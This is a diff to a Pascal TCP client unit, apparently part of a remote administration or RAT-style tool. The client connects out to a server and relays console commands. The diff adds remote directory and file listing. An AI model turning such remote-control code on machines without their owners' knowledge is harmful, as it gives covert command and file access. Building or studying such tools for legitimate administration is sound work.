@@ -1,7 +1,14 @@
 ﻿unit client;
 
-uses System.Net.Sockets, System.Net, System.Text, System.Threading, System, Newtonsoft.Json;
-uses types, cmd;
+uses 
+  System.Net.Sockets, 
+  System.Threading, 
+  System.Text, 
+  System.Net, 
+  System.IO,
+  System, 
+  Newtonsoft.Json,
+  types, cmd;
 
 type TClient = class 
   
@@ -13,7 +20,7 @@ type TClient = class
   public stream: NetworkStream;
   public retry: byte;
   public port: integer;
-  public path: string;
+  public path, epath: string;
   
   public _pp_service: Thread;
   
@@ -59,6 +66,7 @@ type TClient = class
             self._pp_service.Start();
             cmd.CD();
             self.path := cmd.output;
+            self.epath := self.path;
             break; // Если подключились, выходим из цикла
           except
             Thread.Sleep(RETRY_DELAY); // Задержка перед повторной попыткой
@@ -114,14 +122,14 @@ type TClient = class
         var message := Encoding.UTF8.GetString(data, 0, len);
         
         if message = 'PING' then 
-          data := Encoding.UTF8.GetBytes('PONG') else 
+           message := 'PONG' else 
         if message = GETPATH then
-          data := Encoding.UTF8.GetBytes(self.path) else 
-        begin 
-          message := MessageHandler(message);
-          data := Encoding.UTF8.GetBytes(message);
-        end;
-        
+           message := self.path else 
+        if message.StartsWith('E@') then 
+           message := ExplorerHandler(message) else 
+           message := ConsoleHandler(message);
+          
+        data := Encoding.UTF8.GetBytes(message);
         stream.Write(data, 0, data.Length);
         
       end  
@@ -129,8 +137,8 @@ type TClient = class
     
   end;
   
-  /// Обработка полученных сообщений
-  function MessageHandler(msg: string): string;
+  /// Обработка полученных запросов от консоли
+  function ConsoleHandler(msg: string): string;
   begin
     var responce: string;
     
@@ -142,6 +150,33 @@ type TClient = class
       self.path := responce;
     end;
        
+    Result := responce;
+  end;  
+  
+  /// Обработка полученных запросов от проводника
+  function ExplorerHandler(msg: string): string;
+  begin
+    var responce: string;
+
+    case msg of
+      E_GET_PATH: 
+        responce := self.epath;
+      E_GET_DIRS: 
+        responce := JsonConvert.SerializeObject(Directory.GetDirectories(self.epath));
+      E_GET_FILES:
+        responce := JsonConvert.SerializeObject(Directory.GetFiles(self.epath));
+      E_ARROW_UP:
+      begin
+        if Directory.GetDirectoryRoot(self.epath) = self.epath+'\' then exit;
+        self.epath := self.epath.Substring(0, self.epath.LastIndexOf('\'));
+        
+        if Directory.GetDirectoryRoot(path) = self.epath+'\' then 
+          self.epath += '\';
+        responce := self.epath;
+      end;
+        
+    end;
+         
     Result := responce;
   end;
   
